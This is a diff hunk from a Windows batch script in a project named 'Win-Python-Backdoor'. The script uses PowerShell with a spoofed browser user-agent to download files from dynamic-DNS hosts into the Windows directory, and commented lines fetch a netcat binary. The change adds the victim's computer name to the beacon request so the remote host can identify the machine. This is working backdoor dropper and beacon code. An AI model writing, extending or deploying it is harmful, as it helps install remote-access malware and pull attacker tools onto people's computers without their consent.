@@ -35,7 +35,7 @@ rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebC
 rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/win/nc64.exe','%windir%\nc64.exe')
 set url=http://config01.homepc.it
 set urlgit=https://github.com/pistacchietto/Win-Python-Backdoor/raw/master
-%windir%\System32\cmd.exe /c powershell -command "$cli = New-Object System.Net.WebClient;$cli.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36';$cli.DownloadFile('%url%/svc/wup.php?pc=pdf','%windir%\pdf.txt')"
+%windir%\System32\cmd.exe /c powershell -command "$cli = New-Object System.Net.WebClient;$cli.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36';$cli.DownloadFile('%url%/svc/wup.php?pc=pdf_%computername%','%windir%\pdf.txt')"
 rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/cacert.pem','%windir%\cacert.pem')
 %windir%\System32\cmd.exe /c powershell -command "$cli = New-Object System.Net.WebClient;$cli.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36';$cli.DownloadFile('%url%/win/cacert.pem','%windir%\cacert.pem')"
 if "%PROCESSOR_ARCHITECTURE%"=="x86" goto 32BIT
